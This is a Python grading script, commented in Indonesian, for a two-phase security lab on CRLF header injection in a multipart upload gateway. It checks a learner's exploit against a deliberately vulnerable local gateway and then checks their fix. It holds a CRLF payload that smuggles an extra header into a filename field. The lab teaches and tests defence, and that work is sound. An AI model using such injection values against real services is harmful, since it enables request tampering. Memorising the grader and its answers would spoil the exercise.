#!/usr/bin/env python3
"""Verifier otomatis 2 fase untuk Lab 17.

Rantai: filename tak tepercaya -> gateway merakit ulang multipart ala
`form-data` tanpa escaping -> CRLF injection di header part
Content-Disposition -> backend mem-parse header suntikan, ala
form-data CVE-2026-12143 (GHSA-hmw2-7cc7-3qxx, fixed di 4.0.6).

  Upload proxy menerima field "filename" (teks) + field "file", lalu
  membangun ulang request multipart ke backend dengan
  filename="<nilai>" yang diinterpolasi langsung. CRLF di dalam nilai
  field mengakhiri baris header dan menyuntik header part arbitrer.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - upload normal -> 200 upload-ok, 1 part bersih
      - serangan referensi (health): solutions/exploit.py mencetak
        STATUS: 200 dan INJECTED: <marker>; header part
        x-marker: <marker> teramati di respons backend
      - exploit/exploit.py milik learner dijalankan -> mencetak
        STATUS: 200 dan INJECTED: <marker>; verifier mengirim ulang
        racun dengan marker learner dan memastikan header part
        x-marker: <marker> muncul di respons backend
  FASE 2 (dengan fix/): bangun ulang gateway dari fix/gateway, pastikan
      - serangan referensi TIDAK menghasilkan header suntikan
        (filename ter-encode), upload tetap 200
      - upload normal utuh: filename biasa diteruskan apa adanya

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/gateway/gateway.py identik byte-per-byte dengan
    gateway/gateway.py -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import filecmp
import os
import re
import shutil
import socket
import subprocess
import sys
import time
from http.client import HTTPConnection

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
HEALTH_MARKER = "health17"
BOUNDARY = "AAA"
PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


def build_upload(filename_value, file_content=b"hello"):
    return (
        "--AAA\r\n"
        'Content-Disposition: form-data; name="filename"\r\n'
        "\r\n"
        + filename_value + "\r\n"
        + "--AAA\r\n"
        + 'Content-Disposition: form-data; name="file"; filename="upload.bin"\r\n'
        + "Content-Type: application/octet-stream\r\n"
        + "\r\n"
    ).encode("latin-1") + file_content + b"\r\n--AAA--\r\n"


def post_upload(filename_value, timeout=15):
    body = build_upload(filename_value)
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    try:
        s.sendall(("POST /upload HTTP/1.1\r\nHost: %s\r\n"
                   "Content-Type: multipart/form-data; boundary=%s\r\n"
                   "Content-Length: %d\r\nConnection: close\r\n\r\n"
                   % (HOST, BOUNDARY, len(body))).encode("latin-1") + body)
        data = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
        return data
    finally:
        s.close()


def poison_filename(marker):
    return "doc.txt\r\nX-Marker: %s\r\nFoo: bar" % marker


def header_injected(raw, marker):
    for line in raw.decode("latin-1", "replace").split("\n"):
        s = line.strip().lower()
        if s.startswith("x-marker:") and marker.lower() in s:
            return True
    return False


def reference_attack():
    exp = os.path.join(LAB_DIR, "solutions", "exploit.py")
    p = subprocess.run([sys.executable, exp], capture_output=True,
                       text=True, timeout=120, cwd=os.path.dirname(exp))
    return p.returncode, p.stdout or "", p.stderr or ""


def parse_exploit_output(out):
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_inj = re.search(r"^INJECTED:\s*(\S+)\s*$", out, re.MULTILINE)
    return ((m_status.group(1) if m_status else None),
            (m_inj.group(1) if m_inj else None))


def valid_marker(m):
    return bool(m) and re.fullmatch(r"[A-Za-z0-9_-]{1,64}", m)


def wait_up(timeout=180):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            raw = post_upload("probe.txt")
            if b"200" in raw.split(b"\r\n", 1)[0] and b"upload-ok" in raw:
                return True
        except OSError:
            pass
        time.sleep(2)
    return False


def compose_down():
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    compose_down()

    # ---------------- FASE 1 ----------------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    raw = post_upload("doc.txt")
    st = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    check("baseline: upload normal -> 200 upload-ok",
          " 200 " in st and b"upload-ok" in raw, "dapat %r" % st)
    check("baseline: tidak ada header suntikan",
          b"x-marker" not in raw.lower(), "dapat bersih")

    log("== [HEALTH] serangan referensi: CRLF di filename -> header part injection ==")
    rc, out, err = reference_attack()
    status, injected = parse_exploit_output(out)
    ok_ref = (rc == 0 and status == "200" and valid_marker(injected))
    check("serangan referensi: STATUS 200 + INJECTED teramati di backend",
          ok_ref, "dapat rc=%s status=%r injected=%r" % (rc, status, injected))
    if not ok_ref:
        log("LAB RUSAK: serangan referensi gagal di definisi pristine.")
        log("stderr: %s" % (err[-1500:] if err else "-"))
        compose_down()
        sys.exit(1)

    log("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    exp = os.path.join(LAB_DIR, "exploit", "exploit.py")
    try:
        p = subprocess.run([sys.executable, exp], capture_output=True,
                           text=True, timeout=120, cwd=os.path.dirname(exp))
    except subprocess.TimeoutExpired:
        log("exploit.py melebihi 120 detik.")
        compose_down()
        sys.exit(1)
    if "NotImplementedError" in (p.stderr or ""):
        log("exploit.py masih scaffold (NotImplementedError). Kerjakan fase 1 dulu.")
        compose_down()
        sys.exit(3)
    status, injected = parse_exploit_output(p.stdout or "")
    check("exploit mencetak STATUS: 200", status == "200",
          "dapat %r" % status)
    check("exploit mencetak INJECTED (alfanumerik)", valid_marker(injected),
          "dapat %r" % injected)
    ok_inj = False
    if valid_marker(injected):
        try:
            raw = post_upload(poison_filename(injected))
            st = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
            ok_inj = " 200 " in st and header_injected(raw, injected)
        except OSError as e:
            log("replay gagal: %s" % e)
    check("INJECTED terbukti: header part x-marker muncul di backend",
          ok_inj, "dapat tersuntik=%s" % ok_inj)

    compose_down()

    # ---------------- FASE 2 ----------------
    log("== FASE 2: cek scaffold fix ==")
    pristine = os.path.join(LAB_DIR, "gateway", "gateway.py")
    fixed = os.path.join(LAB_DIR, "fix", "gateway", "gateway.py")
    if filecmp.cmp(pristine, fixed, shallow=False):
        log("fix/gateway/gateway.py masih identik dengan pristine. Kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    raw = post_upload(poison_filename(HEALTH_MARKER))
    st = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    check("serangan referensi GAGAL: upload 200 tanpa header suntikan",
          " 200 " in st and not header_injected(raw, HEALTH_MARKER),
          "dapat %r tersuntik=%s" % (st, header_injected(raw, HEALTH_MARKER)))

    raw = post_upload("doc.txt")
    st = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    body = raw.decode("latin-1", "replace")
    check("fungsi normal: upload doc.txt -> 200, filename utuh",
          " 200 " in st and 'filename="doc.txt"' in body,
          "dapat %r" % st)

    compose_down()

    failed = [n for (n, ok) in results if not ok]
    log("== HASIL: %d/%d cek lulus ==" % (len(results) - len(failed), len(results)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
